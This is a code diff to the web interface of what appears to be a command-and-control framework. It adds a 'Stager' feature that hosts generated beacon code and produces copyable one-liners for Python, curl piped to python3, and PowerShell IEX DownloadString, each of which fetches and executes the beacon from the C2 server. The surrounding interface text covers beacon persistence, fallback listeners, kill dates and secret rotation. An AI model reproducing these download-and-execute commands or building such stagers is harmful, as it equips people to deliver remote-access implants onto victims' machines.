@@ -130,6 +130,46 @@
   </div>
 </div>
 
+<!-- Stager Modal -->
+<div class="modal-overlay" id="stager-modal">
+  <div class="modal" style="max-width:560px;width:95vw">
+    <h2 data-i18n="stager_title">🎣 Create Stager</h2>
+    <div class="error-msg" id="stager-error"></div>
+
+    <!-- Create form -->
+    <div id="stager-form">
+      <div class="form-group">
+        <label data-i18n="stager_max_uses">Max uses (0 = unlimited)</label>
+        <input type="number" id="stager-max-uses" value="0" min="0" style="width:100%">
+      </div>
+      <div class="form-group">
+        <label data-i18n="stager_expire">Expires in (hours, 0 = never)</label>
+        <input type="number" id="stager-expire-h" value="0" min="0" style="width:100%">
+      </div>
+      <div style="display:flex;gap:10px;justify-content:flex-end;margin-top:8px">
+        <button class="btn btn-ghost" onclick="closeStagerModal()" data-i18n="stager_cancel">Cancel</button>
+        <button class="btn" onclick="createStager()" data-i18n="stager_create">Create</button>
+      </div>
+    </div>
+
+    <!-- One-liners (shown after creation) -->
+    <div id="stager-oneliners" style="display:none;margin-top:16px">
+      <div style="color:var(--text);font-weight:600;font-size:13px;margin-bottom:10px">📋 One-liners</div>
+      <div id="stager-oneliner-list"></div>
+      <button class="btn btn-ghost" style="margin-top:12px;width:100%" onclick="_stagerBackToForm()">← Back</button>
+    </div>
+
+    <!-- Active stagers list -->
+    <div id="stager-list-section" style="margin-top:20px;border-top:1px solid var(--border);padding-top:14px">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
+        <span style="color:var(--text2);font-size:12px;font-weight:600" data-i18n="stager_active">Active stagers</span>
+        <button class="btn btn-sm btn-ghost" onclick="_loadStagerList()" style="font-size:10px">↻</button>
+      </div>
+      <div id="stager-list" style="max-height:160px;overflow-y:auto;font-size:11px"></div>
+    </div>
+  </div>
+</div>
+
 <!-- Change Password Modal -->
 <div class="modal-overlay" id="pw-modal">
   <div class="modal">
@@ -184,6 +224,7 @@ const LANG = {
     gen_connection:'Connection', gen_c2_label:'C2 Listeners (primary + fallbacks)',
     gen_add_fallback:'+ Add fallback', gen_sleep:'Sleep (seconds)', gen_jitter:'Jitter %',
     gen_persist:'Persistence (survives reboots)', gen_persist_startup:'Startup folder copy (Windows Startup / Linux autostart)', gen_kill_date:'Kill Date (optional)',
+    stager_btn:'🎣 Stager', stager_title:'Create Stager', stager_max_uses:'Max uses (0 = unlimited)', stager_expire:'Expires in (hours, 0 = never)', stager_create:'Create', stager_cancel:'Cancel', stager_copy:'Copy', stager_copied:'Copied!', stager_active:'Active stagers', stager_revoke:'Revoke', stager_uses:'uses', stager_never:'never', stager_expired:'expired',
     gen_kill_date_hint:'Beacon self-destructs after this date. Leave empty for no limit.',
     gen_hb_days:'Heartbeat timeout (days)', gen_hb_hint:'If C2 is unreachable for this many days the beacon self-destructs. 0 = disabled.',
     sec_secret_title:'Agent Secret Rotation', sec_secret_desc:'Generates a new agent secret. Active beacons will receive the new secret on their next check-in and update automatically. The old secret stays valid until all beacons rotate.',
@@ -291,6 +332,7 @@ const LANG = {
     gen_connection:'Conexión', gen_c2_label:'C2 Listeners (primario + fallbacks)',
     gen_add_fallback:'+ Agregar fallback', gen_sleep:'Sleep (segundos)', gen_jitter:'Jitter %',
     gen_persist:'Persistencia (sobrevive reinicios)', gen_persist_startup:'Copia en carpeta de arranque (Windows Startup / Linux autostart)', gen_kill_date:'Kill Date (opcional)',
+    stager_btn:'🎣 Stager', stager_title:'Crear Stager', stager_max_uses:'Máx. usos (0 = ilimitado)', stager_expire:'Expira en (horas, 0 = nunca)', stager_create:'Crear', stager_cancel:'Cancelar', stager_copy:'Copiar', stager_copied:'¡Copiado!', stager_active:'Stagers activos', stager_revoke:'Revocar', stager_uses:'usos', stager_never:'nunca', stager_expired:'expirado',
     gen_kill_date_hint:'El beacon se autodestruye después de esta fecha. Vacío = sin límite.',
     gen_hb_days:'Heartbeat timeout (días)', gen_hb_hint:'Si el C2 no responde en este número de días el beacon se autodestruye. 0 = desactivado.',
     sec_secret_title:'Rotación de Agent Secret', sec_secret_desc:'Genera un nuevo agent secret. Los beacons activos recibirán el nuevo secret en su próximo check-in y se actualizarán automáticamente. El secret viejo sigue válido hasta que todos roten.',
@@ -2606,17 +2648,20 @@ function renderGenerateView() {
               <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('linux')">⬇ Linux ELF</button>
               <button class="btn btn-sm btn-ghost" onclick="showWindowsInstructions()">🪟 Windows EXE</button>
               <button class="btn btn-sm btn-ghost" onclick="copyBeacon()" id="copy-btn">⎘ Copy</button>
+              <button class="btn btn-sm btn-ghost" onclick="openStagerModal()" id="stager-btn-py" data-i18n="stager_btn">🎣 Stager</button>
             </div>
             <div style="display:flex;gap:6px;flex-wrap:wrap;display:none" id="beacon-dl-buttons-java">
               <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('java-src')">⬇ .java</button>
               <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('jar')">⬇ .jar</button>
               <button class="btn btn-sm btn-ghost" onclick="copyBeacon()" id="copy-btn-java">⎘ Copy</button>
+              <button class="btn btn-sm btn-ghost" onclick="openStagerModal()" data-i18n="stager_btn">🎣 Stager</button>
             </div>
             <div style="display:flex;gap:6px;flex-wrap:wrap;display:none" id="beacon-dl-buttons-go">
               <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('go-src')">⬇ .go</button>
               <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('go-linux')">⬇ Linux ELF</button>
               <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('go-windows')">⬇ Windows EXE</button>
               <button class="btn btn-sm btn-ghost" onclick="copyBeacon()" id="copy-btn-go">⎘ Copy</button>
+              <button class="btn btn-sm btn-ghost" onclick="openStagerModal()" data-i18n="stager_btn">🎣 Stager</button>
             </div>
           </div>
           <div style="flex:1;display:flex;flex-direction:column;min-height:0;background:var(--bg);border:1px solid var(--border);border-radius:8px;overflow:hidden">
@@ -5463,6 +5508,117 @@ function copyBeacon() {
     });
     showToast('Beacon code copied!', 'success');
   }).catch(() => showToast('Copy failed', 'error'));
+}
+
+// ── Stager ────────────────────────────────────────────────
+function openStagerModal() {
+  const code = document.getElementById('beacon-code').textContent;
+  if (!code.trim()) { showToast('Generate a beacon first', 'error'); return; }
+  document.getElementById('stager-error').style.display = 'none';
+  document.getElementById('stager-form').style.display = '';
+  document.getElementById('stager-oneliners').style.display = 'none';
+  document.getElementById('stager-max-uses').value = '0';
+  document.getElementById('stager-expire-h').value = '0';
+  document.getElementById('stager-modal').classList.add('active');
+  _loadStagerList();
+}
+
+function closeStagerModal() {
+  document.getElementById('stager-modal').classList.remove('active');
+}
+
+function _stagerBackToForm() {
+  document.getElementById('stager-form').style.display = '';
+  document.getElementById('stager-oneliners').style.display = 'none';
+  document.getElementById('stager-error').style.display = 'none';
+}
+
+async function createStager() {
+  const code = document.getElementById('beacon-code').textContent;
+  if (!code.trim()) return;
+  const maxUses = parseInt(document.getElementById('stager-max-uses').value) || 0;
+  const expireH = parseInt(document.getElementById('stager-expire-h').value) || 0;
+  const errEl = document.getElementById('stager-error');
+  errEl.style.display = 'none';
+
+  const resp = await apiFetch('/api/stager', {
+    method: 'POST',
+    body: JSON.stringify({ code, lang: 'py', max_uses: maxUses, expire_h: expireH })
+  });
+  if (!resp || !resp.ok) {
+    errEl.textContent = 'Error creating stager';
+    errEl.style.display = 'block';
+    return;
+  }
+  const data = await resp.json();
+  const token = data.token;
+  const base = window.location.origin;
+  const url = `${base}/s/${token}`;
+
+  const oneliners = [
+    { label: 'Python', cmd: `python3 -c "import urllib.request,tempfile,os,sys; exec(compile(urllib.request.urlopen('${url}').read(), '<stager>', 'exec'))"` },
+    { label: 'Bash', cmd: `curl -s "${url}" | python3` },
+    { label: 'PowerShell', cmd: `IEX(New-Object Net.WebClient).DownloadString('${url}')` },
+  ];
+
+  const listEl = document.getElementById('stager-oneliner-list');
+  listEl.innerHTML = oneliners.map((ol, i) => `
+    <div style="margin-bottom:10px">
+      <div style="color:var(--text3);font-size:10px;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px">${ol.label}</div>
+      <div style="display:flex;gap:6px;align-items:flex-start">
+        <code style="flex:1;background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:7px 10px;font-size:10px;word-break:break-all;color:var(--accent2)">${ol.cmd}</code>
+        <button class="btn btn-sm btn-ghost" style="flex-shrink:0;font-size:10px" data-stager-idx="${i}">⎘ Copy</button>
+      </div>
+    </div>
+  `).join('');
+  // Attach copy handlers via data attribute to avoid HTML escaping issues
+  listEl.querySelectorAll('[data-stager-idx]').forEach(btn => {
+    const idx = parseInt(btn.dataset.stagerIdx);
+    btn.addEventListener('click', () => _stagerCopyLine(btn, oneliners[idx].cmd));
+  });
+
+  document.getElementById('stager-form').style.display = 'none';
+  document.getElementById('stager-oneliners').style.display = '';
+  _loadStagerList();
+}
+
+function _stagerCopyLine(btn, cmd) {
+  navigator.clipboard.writeText(cmd).then(() => {
+    const orig = btn.textContent;
+    btn.textContent = '✓';
+    setTimeout(() => btn.textContent = orig, 1800);
+  });
+}
+
+async function _loadStagerList() {
+  const listEl = document.getElementById('stager-list');
+  if (!listEl) return;
+  const resp = await apiFetch('/api/stager');
+  if (!resp || !resp.ok) return;
+  const items = await resp.json();
+  const _lang = localStorage.getItem('lang') || 'en';
+  if (!items.length) {
+    listEl.innerHTML = `<div style="color:var(--text3);padding:6px 0">—</div>`;
+    return;
+  }
+  listEl.innerHTML = items.map(st => {
+    const statusColor = st.active ? 'var(--green)' : 'var(--text3)';
+    const statusLabel = st.active ? (LANG[_lang]?.stager_active || 'active') : (LANG[_lang]?.stager_expired || 'expired');
+    const usesLabel = st.max_uses > 0 ? `${st.used_count}/${st.max_uses}` : `${st.used_count}`;
+    const expiresLabel = st.expires_at ? new Date(st.expires_at).toLocaleDateString() : (LANG[_lang]?.stager_never || 'never');
+    return `<div style="display:flex;align-items:center;gap:8px;padding:5px 0;border-bottom:1px solid var(--border)">
+      <span style="color:${statusColor};font-size:9px">●</span>
+      <code style="color:var(--accent2);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${st.token}</code>
+      <span style="color:var(--text3);font-size:10px">${usesLabel} ${LANG[_lang]?.stager_uses || 'uses'}</span>
+      <span style="color:var(--text3);font-size:10px">exp: ${expiresLabel}</span>
+      <button class="btn btn-sm btn-ghost" style="font-size:10px;color:#ef4444" onclick="_stagerRevoke('${st.token}')">${LANG[_lang]?.stager_revoke || 'Revoke'}</button>
+    </div>`;
+  }).join('');
+}
+
+async function _stagerRevoke(token) {
+  const resp = await apiFetch(`/api/stager/${token}`, { method: 'DELETE' });
+  if (resp && resp.ok) _loadStagerList();
 }
 
 async function downloadBeacon(type) {
